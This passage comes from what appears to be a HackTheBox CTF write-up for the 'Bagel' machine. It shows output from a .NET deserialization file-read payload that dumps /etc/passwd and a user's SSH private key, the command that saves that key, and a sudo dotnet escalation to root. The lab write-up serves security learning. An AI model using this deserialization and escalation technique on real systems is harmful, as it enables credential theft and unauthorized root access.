+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;UserId&#39;</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;Session&#39;</span><span class="o">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">,</span> <span class="s1">&#39;Time&#39;</span><span class="o">:</span> <span class="s1">&#39;8:54:05&#39;</span><span class="p">,</span> <span class="s1">&#39;RemoveOrder&#39;</span><span class="o">:</span> <span class="p">{</span><span class="s1">&#39;$type&#39;</span><span class="o">:</span> <span class="s1">&#39;bagel_server.File, bagel&#39;</span><span class="p">,</span> <span class="s1">&#39;ReadFile&#39;</span><span class="o">:</span> <span class="s1">&#39;root❌0:0:root:/root:/bin/bash\nbin❌1:1:bin:/bin:/sbin/nologin\ndaemon❌2:2:daemon:/sbin:/sbin/nologin\nadm❌3:4:adm:/var/adm:/sbin/nologin\nlp❌4:7:lp:/var/spool/lpd:/sbin/nologin\nsync❌5:0:sync:/sbin:/bin/sync\nshutdown❌6:0:shutdown:/sbin:/sbin/shutdown\nhalt❌7:0:halt:/sbin:/sbin/halt\nmail❌8:12:mail:/var/spool/mail:/sbin/nologin\noperator❌11:0:operator:/root:/sbin/nologin\ngames❌12💯games:/usr/games:/sbin/nologin\nftp❌14:50:FTP User:/var/ftp:/sbin/nologin\nnobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin\ndbus❌81:81:System message bus:/:/sbin/nologin\ntss❌59:59:Account used for TPM access:/dev/null:/sbin/nologin\nsystemd-network❌192:192:systemd Network Management:/:/usr/sbin/nologin\nsystemd-oom❌999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin\nsystemd-resolve❌193:193:systemd Resolver:/:/usr/sbin/nologin\npolkitd❌998:997:User for polkitd:/:/sbin/nologin\nrpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\nabrt❌173:173::/etc/abrt:/sbin/nologin\nsetroubleshoot❌997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin\ncockpit-ws❌996:994:User for cockpit web service:/nonexisting:/sbin/nologin\ncockpit-wsinstance❌995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin\nrpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nsshd❌74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin\nchrony❌994:992::/var/lib/chrony:/sbin/nologin\ndnsmasq❌993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin\ntcpdump❌72:72::/:/sbin/nologin\nsystemd-coredump❌989:989:systemd Core Dumper:/:/usr/sbin/nologin\nsystemd-timesync❌988:988:systemd Time Synchronization:/:/usr/sbin/nologin\ndeveloper❌1000:1000::/home/developer:/bin/bash\nphil❌1001:1001::/home/phil:/bin/bash\n_laurel❌987:987::/var/log/laurel:/bin/false&#39;</span><span class="p">,</span> <span class="s1">&#39;WriteFile&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">},</span> <span class="s1">&#39;WriteOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">,</span> <span class="s1">&#39;ReadOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">}</span>
+</span></span></code></pre></div><p>Next, we can get the private key of the <code>phil</code> user which we can use for SSH:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">python3</span> <span class="nx">interact_bagel</span><span class="p">.</span><span class="nx">py</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;UserId&#39;</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;Session&#39;</span><span class="o">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">,</span> <span class="s1">&#39;Time&#39;</span><span class="o">:</span> <span class="s1">&#39;8:55:19&#39;</span><span class="p">,</span> <span class="s1">&#39;RemoveOrder&#39;</span><span class="o">:</span> <span class="p">{</span><span class="s1">&#39;$type&#39;</span><span class="o">:</span> <span class="s1">&#39;bagel_server.File, bagel&#39;</span><span class="p">,</span> <span class="s1">&#39;ReadFile&#39;</span><span class="o">:</span> <span class="s1">&#39;-----BEGIN OPENSSH PRIVATE KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----&#39;</span><span class="p">,</span> <span class="s1">&#39;WriteFile&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">},</span> <span class="s1">&#39;WriteOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">,</span> <span class="s1">&#39;ReadOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">echo</span> <span class="s1">&#39;-----BEGIN OPENSSH PRIVATE KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----&#39;</span> <span class="o">&gt;</span> <span class="nx">id_rsa_phil</span>
+</span></span></code></pre></div><p>Now, we can successfully login to the machine as <code>phil</code></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_10.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Now using the <code>dev</code> user’s password we got from the <code>DB</code> class of the <code>bagel.dll</code> , we can escalate to the <code>developer</code> user</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_11.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Doing <code>sudo -l</code> , we can see that we are allowed to run <code>/usr/bin/donet</code> as user <code>root</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">[</span><span class="nx">developer</span><span class="err">@</span><span class="nx">bagel</span> <span class="o">~</span><span class="p">]</span><span class="nx">$</span> <span class="nx">sudo</span> <span class="o">-</span><span class="nx">l</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Matching</span> <span class="nx">Defaults</span> <span class="nx">entries</span> <span class="k">for</span> <span class="nx">developer</span> <span class="nx">on</span> <span class="nx">bagel</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="o">!</span><span class="nx">visiblepw</span><span class="p">,</span> <span class="nx">always_set_home</span><span class="p">,</span> <span class="nx">match_group_by_gid</span><span class="p">,</span> <span class="nx">always_query_group_plugin</span><span class="p">,</span> <span class="nx">env_reset</span><span class="p">,</span> <span class="nx">env_keep</span><span class="o">=</span><span class="s2">&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;</span><span class="p">,</span> <span class="nx">env_keep</span><span class="o">+=</span><span class="s2">&#34;MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span><span class="p">,</span> <span class="nx">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_COLLATE
+</span></span></span><span class="line"><span class="cl"><span class="s2">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span><span class="p">,</span> <span class="nx">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;</span><span class="p">,</span> <span class="nx">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">secure_path</span><span class="o">=</span><span class="err">/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">User</span> <span class="nx">developer</span> <span class="nx">may</span> <span class="nx">run</span> <span class="nx">the</span> <span class="nx">following</span> <span class="nx">commands</span> <span class="nx">on</span> <span class="nx">bagel</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">NOPASSWD</span><span class="o">:</span> <span class="err">/usr/bin/dotnet</span>
+</span></span></code></pre></div><p>Checking GTFO bins, we can see spawn an interactive shell and then use <code>System.Diagnostic.Process.Start</code> method spawn any child process, now since <code>donet</code> was running as root, we were able to get the shell as <code>root</code></p>
+<p><a href="https://gtfobins.github.io/gtfobins/dotnet/" target="_blank" rel="noreferrer">https://gtfobins.github.io/gtfobins/dotnet/</a></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_12.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+      
+      
+    
+    <div class="place-self-center">
+      
+        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+          Author
+        </div>
+        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+          D4mianWayne
+        </div>
+      
+      
+        <div class="text-sm text-neutral-700 dark:text-neutral-400">Wannabe pwner!!!</div>
+      
+      <div class="text-2xl sm:text-lg">
+</div>
+    </div>
+  </div>
+
+
+      
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://www.facebook.com/sharer/sharer.php?u=//localhost:1313/posts/bagel-htb/&amp;quote=HackTheBox%20-%20Bagel"
+          title="Share on Facebook"
+          aria-label="Share on Facebook"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://x.com/intent/tweet/?url=//localhost:1313/posts/bagel-htb/&amp;text=HackTheBox%20-%20Bagel"
+          title="Post on X"
+          aria-label="Post on X"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://pinterest.com/pin/create/bookmarklet/?url=//localhost:1313/posts/bagel-htb/&amp;description=HackTheBox%20-%20Bagel"
+          title="Pin on Pinterest"
+          aria-label="Pin on Pinterest"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://reddit.com/submit/?url=//localhost:1313/posts/bagel-htb/&amp;resubmit=true&amp;title=HackTheBox%20-%20Bagel"
+          title="Submit to Reddit"
+          aria-label="Submit to Reddit"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=//localhost:1313/posts/bagel-htb/&amp;title=HackTheBox%20-%20Bagel"
+          title="Share on LinkedIn"
+          aria-label="Share on LinkedIn"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="mailto:?body=//localhost:1313/posts/bagel-htb/&amp;subject=HackTheBox%20-%20Bagel"
+          title="Send via email"
+          aria-label="Send via email"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://www.threads.net/intent/post?text=//localhost:1313/posts/bagel-htb/%20HackTheBox%20-%20Bagel"
+          title="Post on Threads"
+          aria-label="Post on Threads"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M331.5 235.7c2.2 .9 4.2 1.9 6.3 2.8c29.2 14.1 50.6 35.2 61.8 61.4c15.7 36.5 17.2 95.8-30.3 143.2c-36.2 36.2-80.3 52.5-142.6 53h-.3c-70.2-.5-124.1-24.1-160.4-70.2c-32.3-41-48.9-98.1-49.5-169.6V256v-.2C17 184.3 33.6 127.2 65.9 86.2C102.2 40.1 156.2 16.5 226.4 16h.3c70.3 .5 124.9 24 162.3 69.9c18.4 22.7 32 50 40.6 81.7l-40.4 10.8c-7.1-25.8-17.8-47.8-32.2-65.4c-29.2-35.8-73-54.2-130.5-54.6c-57 .5-100.1 18.8-128.2 54.4C72.1 146.1 58.5 194.3 58 256c.5 61.7 14.1 109.9 40.3 143.3c28 35.6 71.2 53.9 128.2 54.4c51.4-.4 85.4-12.6 113.7-40.9c32.3-32.2 31.7-71.8 21.4-95.9c-6.1-14.2-17.1-26-31.9-34.9c-3.7 26.9-11.8 48.3-24.7 64.8c-17.1 21.8-41.4 33.6-72.7 35.3c-23.6 1.3-46.3-4.4-63.9-16c-20.8-13.8-33-34.8-34.3-59.3c-2.5-48.3 35.7-83 95.2-86.4c21.1-1.2 40.9-.3 59.2 